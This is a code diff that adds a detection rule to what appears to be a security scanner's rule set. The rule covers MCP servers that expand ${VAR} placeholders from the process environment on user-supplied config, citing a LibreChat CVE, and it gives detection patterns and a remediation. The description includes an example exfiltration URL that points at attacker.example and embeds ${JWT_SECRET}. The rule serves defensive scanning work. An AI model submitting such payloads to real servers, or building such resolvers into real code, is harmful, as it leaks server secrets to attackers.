@@ -4795,6 +4795,38 @@ _r(
     owasp_agentic_references=["ASI04", "ASI02"],
 )
 
+_r(
+    "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001",
+    "MCP server resolves ${VAR} placeholders against process.env on a "
+    "user-supplied server config (secret exfiltration)",
+    "An MCP server resolves `${VAR}` / `$VAR` placeholders against its own "
+    "process environment (`process.env` in Node, `os.environ` / "
+    "`os.path.expandvars` in Python) while parsing or validating a "
+    "user-supplied MCP server config — typically the server URL. An "
+    "authenticated user can then submit a URL like "
+    "`https://attacker.example/?k=${JWT_SECRET}` and the server "
+    "interpolates its own secrets into the outbound request, exfiltrating "
+    "them to an attacker-controlled host. This is the CVE-2026-32625 class "
+    "(LibreChat <= 0.8.3 resolved `${VAR}` against `process.env` during Zod "
+    "validation of user-supplied MCP server URLs, leaking `CREDS_KEY`, "
+    "`JWT_SECRET`, `MONGO_URI`, etc.; CWE-200, CVSS 9.6). Detected as a "
+    "`${...}`-placeholder resolver that reads the process environment "
+    "(`.replace(/.../, ... process.env ...)`, `os.path.expandvars(...)`, "
+    "`.format(**os.environ)`) inside an MCP-server config/URL path.",
+    Severity.CRITICAL,
+    Category.SECRET_EXPOSURE,
+    "Never expand environment placeholders found inside a user-supplied "
+    "value. Treat the MCP server URL/config as untrusted data: reject or "
+    "percent-encode `${...}` sequences, and resolve env references only "
+    "from a server-side allowlist of config keys that are known-safe to "
+    "echo — never the full `process.env` / `os.environ`. Validate the "
+    "resolved URL host against an allowlist before connecting.",
+    sarif_name="McpEnvPlaceholderExfil",
+    cve_references=["CVE-2026-32625"],
+    owasp_mcp_references=["MCP01:2025"],
+    owasp_agentic_references=["ASI03"],
+)
+
 
 # ---------------------------------------------------------------------------
 # Internal / meta rules (surfaced when the scanner itself has a problem)
